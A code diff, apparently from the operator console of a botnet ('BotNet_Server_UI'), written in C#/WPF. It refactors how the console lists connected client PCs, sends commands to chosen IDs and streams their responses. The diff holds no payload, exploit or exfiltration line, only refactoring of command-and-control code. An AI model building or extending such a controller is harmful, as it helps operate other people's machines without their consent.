@@ -5,7 +5,6 @@ using System.IO;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
-using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
@@ -30,7 +29,7 @@ namespace BotNet_Server_UI
         public string[] ips;
         readonly List<UIElement> args = new List<UIElement>();
         readonly string argtype = null;
-        IP[] arr;
+        Client[] arr;
         public ulong TotalMem = new Memory().GetAllMemory();
 
         public MainWindow()
@@ -160,7 +159,7 @@ namespace BotNet_Server_UI
                     if (ips == null || !isArrayValid)
                     {
                         m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Программа запустилось впервые и не имеет заданного списка ID\r\n";
-                        IPSet iPSet = new IPSet(true);
+                        IDSet iPSet = new IDSet(true);
                         iPSet.Show();
                         m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Запущено IDSet окно\r\n";
                         return;
@@ -281,30 +280,36 @@ namespace BotNet_Server_UI
                     linkrenew:
                         if (arr == null)
                         {
-                            arr = await ApiRequest.GetProductAsync<IP[]>("api/v1/client");
+                            arr = await ApiRequest.GetProductAsync<Client[]>("api/v1/client");
                             goto linkrenew;
                         }
                         ListenResponses();
                     }
                     else
                     {
-                        arr = await ApiRequest.KeepAliveGetProduct<IP[]>("api/v1/listen/clients");
+                        arr = await ApiRequest.KeepAliveGetProduct<Client[]>("api/v1/listen/clients");
                     linkrenew:
                         if (arr == null)
                         {
-                            arr = await ApiRequest.GetProductAsync<IP[]>("api/v1/client");
+                            arr = await ApiRequest.GetProductAsync<Client[]>("api/v1/client");
                             goto linkrenew;
                         }
+                        _ = ListenSingleResponce(arr.Last().id);
                     }
-                    string res = "";
-                    arr.ToList().ForEach(x => res += "Id: " + x.id + " - " + x.nameofpc + "\n");
-                    await ClientList.Dispatcher.BeginInvoke(new Action(() => ClientList.Text = res));
+                    _ = SetClientList();
                 }
             }
             catch (Exception ex)
             {
                 ExceptionHandler.RegisterNew(ex);
             }
+        }
+
+        private async Task SetClientList()
+        {
+            string res = "";
+            arr.ToList().ForEach(x => res += "Id: " + x.id + " - " + x.nameofpc + "\n");
+            await ClientList.Dispatcher.BeginInvoke(new Action(() => ClientList.Text = res));
         }
 
         private void ListenResponses()
@@ -323,23 +328,29 @@ namespace BotNet_Server_UI
         {
             while (true)
             {
-                linkrenew:
                 var response = await ApiRequest.KeepAliveGetProduct<Response>($"api/v1/listen/responses/{id}");
                 if (response == null)
                 {
-                    goto linkrenew;
+                    try
+                    {
+                        response = (await ApiRequest.GetProductAsync<Responses>($"api/v1/responses/{id}")).responses.Last();
+                    }
+                    catch (Exception ex)
+                    {
+                        ExceptionHandler.RegisterNew(ex);
+                    }
                 }
                 await LogPanel.Dispatcher.BeginInvoke(new Action(() => LogPanel.Text += "(" + DateTime.Now.ToLongTimeString() + ") " + response.response + "\n"));
             }
-        }
+        } // rewrite
 
         private void IPSetButton_Click(object sender, RoutedEventArgs e)
         {
             try
             {
-                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / IDSetButton_Click event) Запускаю откно задачи ID для отправки комманд\r\n";
-                IPSet iPSet = new IPSet();
-                iPSet.Show();
+                m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / IDSetButton_Click event) Запускаю окно задачи ID для отправки комманд\r\n";
+                IDSet IDset = new IDSet();
+                IDset.Show();
             }
             catch (Exception ex)
             {
@@ -476,9 +487,9 @@ namespace BotNet_Server_UI
                             {
                                 foreach (var window in Application.Current.Windows)
                                 {
-                                    if (window is IPSet)
+                                    if (window is IDSet)
                                     {
-                                        (window as IPSet).isSendFrom = false;
+                                        (window as IDSet).isSendFrom = false;
                                     }
                                 }
                                 Command.IsEnabled = false;
@@ -565,9 +576,9 @@ namespace BotNet_Server_UI
                             {
                                 foreach (var window in Application.Current.Windows)
                                 {
-                                    if (window is IPSet)
+                                    if (window is IDSet)
                                     {
-                                        (window as IPSet).isSendFrom = false;
+                                        (window as IDSet).isSendFrom = false;
                                     }
                                 }
                                 Command.IsEnabled = false;
